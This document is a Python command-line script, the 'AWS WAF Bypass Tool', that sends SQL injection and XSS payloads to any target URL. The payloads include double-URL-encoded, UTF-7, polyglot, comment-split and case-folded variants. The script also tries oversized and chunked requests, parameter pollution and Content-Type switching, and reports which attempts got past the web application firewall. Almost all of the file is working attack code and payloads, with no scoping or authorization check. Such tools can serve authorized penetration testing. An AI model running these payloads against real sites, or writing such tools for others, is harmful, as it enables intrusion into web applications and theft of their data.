#!/usr/bin/env python3
"""
AWS WAF Bypass Tool

MITRE ATT&CK Mapping:
  T1190 - Exploit Public-Facing Application
  T1203 - Exploitation for Client Execution

Tests encoding variants, size limit evasion, rule group bypass, and
Content-Type mutation against AWS WAF-protected targets.
"""

import argparse
import json
import os
import signal
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

init(autoreset=True)
SHOULD_EXIT = False

BANNER = f"""{Fore.CYAN}
    _        __        __    _  __        __
   / \\      / \\ \\      / /  | | \\ \\      / /
  / _ \\    / _ \\ \\ /\\ / /   | |  \\ \\ /\\ / /
 / ___ \\  / ___ \\ V  V /    | |   \\ V  V /
/_/   \\_\\/_/   \\_\\_/\\_/     |_|    \\_/\\_/
{Fore.RESET}"""


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

PAYLOADS = [
    ("UTF-8 SQLi", "' OR '1'='1"), ("Double URL SQLi", "%2527%2520OR%2520%25271%2527%25253D%25271"),
    ("Mixed SQLi", "'%20OR%20%271%27%3D%271"), ("Comment SQLi", "'/**/OR/**/'1'='1"),
    ("Case SQLi", "UnIoN SeLeCt 1,2,3,4"), ("Standard XSS", "<script>alert(1)</script>"),
    ("Double URL XSS", "%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
    ("Polyglot XSS", "\"'><img src=x onerror=alert(1)>"),
    ("UTF-7 XSS", "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"),
    ("Null XSS", "<script>alert(1)%00</script>"),
]


def check_target(url):
    try:
        resp = requests.get(url, timeout=10)
        return resp.status_code < 500
    except requests.RequestException:
        return False


def technique_encoding_variants(url, param, timeout_sec):
    results = []
    baseline = requests.get(url, timeout=timeout_sec, headers={"User-Agent": "Mozilla/5.0"})
    bl_len = len(baseline.text)
    for label, payload in PAYLOADS:
        if SHOULD_EXIT:
            break
        try:
            resp = requests.get(url, params={param: payload}, timeout=timeout_sec, headers={"User-Agent": "Mozilla/5.0"})
            blocked = resp.status_code in (403, 429) or "requestblocked" in resp.text.lower()
            body = resp.text.lower()
            reflected = payload.lower()[:20] in body if len(payload) > 5 else False
            sql_err = any(kw in body for kw in ["sql", "mysql", "syntax", "unclosed", "quotation"])
            bypassed = not blocked and resp.status_code == 200 and (reflected or sql_err or abs(len(body) - bl_len) > 30)
            results.append({"technique": "encoding_variants", "label": label, "status": resp.status_code, "bypassed": bypassed})
        except requests.RequestException as e:
            results.append({"technique": "encoding_variants", "label": label, "bypassed": False, "error": str(e)})
    return results


def technique_size_evasion(url, param, timeout_sec):
    results = []
    long_payload = "A" * 9000 + "' OR '1'='1"
    try:
        resp = requests.get(url, params={param: long_payload}, timeout=timeout_sec, headers={"User-Agent": "Mozilla/5.0"})
        results.append({"technique": "size_evasion", "variant": "oversized", "status": resp.status_code, "bypassed": resp.status_code == 200})
    except requests.RequestException as e:
        results.append({"technique": "size_evasion", "variant": "oversized", "bypassed": False, "error": str(e)})
    for cs, label in [(100, "chunk_100"), (500, "chunk_500")]:
        if SHOULD_EXIT:
            break
        try:
            resp = requests.post(url, data={param: "B" * cs + "<script>alert(1)</script>"},
                                 headers={"User-Agent": "Mozilla/5.0", "Transfer-Encoding": "chunked",
                                          "Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout_sec)
            results.append({"technique": "size_evasion", "variant": label, "status": resp.status_code, "bypassed": resp.status_code in (200, 201)})
        except requests.RequestException as e:
            results.append({"technique": "size_evasion", "variant": label, "bypassed": False, "error": str(e)})
    return results


def technique_rule_bypass(url, param, timeout_sec):
    tests = [
        ("Comment", "1'/*!*/OR/*!*/'1'='1"), ("Parameter Pollution", f"{param}=1&{param}=2"),
        ("Case Folding", "1' oR '1'='1"), ("Tab Inj", "1'\\tOR\\t'1'='1"),
        ("Newline", "1'\\nOR\\n'1'='1"),
    ]
    results = []
    for label, payload in tests:
        if SHOULD_EXIT:
            break
        try:
            resp = requests.get(url, params={param: payload}, timeout=timeout_sec, headers={"User-Agent": "Mozilla/5.0"})
            blocked = resp.status_code in (403, 429) or "requestblocked" in resp.text.lower()
            results.append({"technique": "rule_bypass", "label": label, "status": resp.status_code, "bypassed": not blocked and resp.status_code == 200})
        except requests.RequestException as e:
            results.append({"technique": "rule_bypass", "label": label, "bypassed": False, "error": str(e)})
    return results


def technique_content_type(url, param, timeout_sec):
    results = []
    payload = "' OR '1'='1"
    tests = [
        ("application/json", json.dumps({param: payload})),
        ("application/xml", f"<root><{param}>{payload}</{param}></root>"),
        ("text/plain", {param: payload}),
    ]
    for ct, data in tests:
        if SHOULD_EXIT:
            break
        try:
            resp = requests.post(url, data=data, headers={"Content-Type": ct, "User-Agent": "Mozilla/5.0"}, timeout=timeout_sec)
            results.append({"technique": "content_type", "label": ct, "status": resp.status_code, "bypassed": resp.status_code in (200, 201)})
        except requests.RequestException as e:
            results.append({"technique": "content_type", "label": ct, "bypassed": False, "error": str(e)})
    return results


def run_techniques(url, param, timeout_sec, threads):
    print(f"\n{Fore.CYAN}[*] Target: {url} | param={param}{Style.RESET_ALL}")
    if not check_target(url):
        print(f"{Fore.RED}[X] Target unreachable.{Style.RESET_ALL}")
        return []
    all_results = []
    techniques = [
        ("Encoding Variants", technique_encoding_variants),
        ("Size Evasion", technique_size_evasion),
        ("Rule Bypass", technique_rule_bypass),
        ("Content-Type", technique_content_type),
    ]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        fmap = {ex.submit(fn, url, param, timeout_sec): name for name, fn in techniques}
        for f in as_completed(fmap):
            name = fmap[f]
            try:
                res = f.result()
                all_results.extend(res)
                b = sum(1 for r in res if r.get("bypassed"))
                print(f"{Fore.GREEN}[+] {name}: {b}/{len(res)} bypassed{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[X] {name} failed: {e}{Style.RESET_ALL}")
    return all_results


def print_report(results):
    if not results:
        return
    bypassed = [r for r in results if r.get("bypassed")]
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  AWS WAF BYPASS | total={len(results)} bypassed={len(bypassed)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for r in bypassed:
        d = r.get("label") or r.get("variant", "?")
        print(f"  {Fore.GREEN}[BYPASS] {r['technique']} | {d}{Style.RESET_ALL}")
    for r in [r for r in results if not r.get("bypassed")][:10]:
        d = r.get("label") or r.get("variant", "?")
        print(f"  {Fore.YELLOW}[BLOCKED] {r['technique']} | {d}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="AWS WAF Bypass — MITRE T1190, T1203")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="id", help="Target parameter name")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--threads", type=int, default=4, help="Max threads")
    parser.add_argument("-o", "--output", help="Save JSON output")
    args = parser.parse_args()
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    results = run_techniques(args.url, args.param, args.timeout, args.threads)
    print_report(results)
    if args.output and results:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] {sum(1 for r in results if r.get('bypassed'))} bypasses found.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
